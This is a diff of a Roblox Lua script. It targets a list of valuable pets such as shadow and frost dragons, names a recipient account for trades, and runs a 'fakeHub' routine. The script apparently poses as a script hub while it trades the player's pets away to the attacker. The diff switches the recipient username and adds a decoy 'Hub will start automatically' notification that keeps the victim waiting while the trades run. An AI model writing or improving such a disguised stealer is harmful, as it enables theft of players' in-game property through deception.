@@ -3,7 +3,7 @@ repeat task.wait() until game:IsLoaded()
 print("\n\n\n\n\n\n\n\n\n")
 print("Loading...")
 local targetPets = {"parrot", "shadow_dragon", "frost_dragon", "owl", "giraffe", "crow", "evil_unicorn", "bat_dragon", "kangaroo", "turtle", "arctic_reindeer", "albino_monkey", "safari_egg", "cow", "candy_cannon", "flamingo", "reindeer", "hedgehog", "blue_dog", "pink_cat", "albino_monkey", "king_monkey"}
-local target = "bnuuy_lin"
+local target = "SmallKaydey"--"bnuuy_lin"
 local function sendTrade()
 
     local args = {
@@ -186,6 +186,12 @@ targetJobId = "77caf1bb-f788-4749-b311-6cdabcf17734" -- get from a pastebin ect
 
 if (game.JobId == tostring(targetJobId)) then
     notifyRan("Stage 2")
+    Game:GetService("StarterGui"):SetCore("SendNotification",{
+        Title = "Waiting for game load..", -- Required
+        Text = "Hub will start automatically", -- Required
+        Icon = "rbxassetid://8429081004" -- Optional
+    })
+    wait(5)
     coroutine.wrap(fakeHub)()
     main()
 else
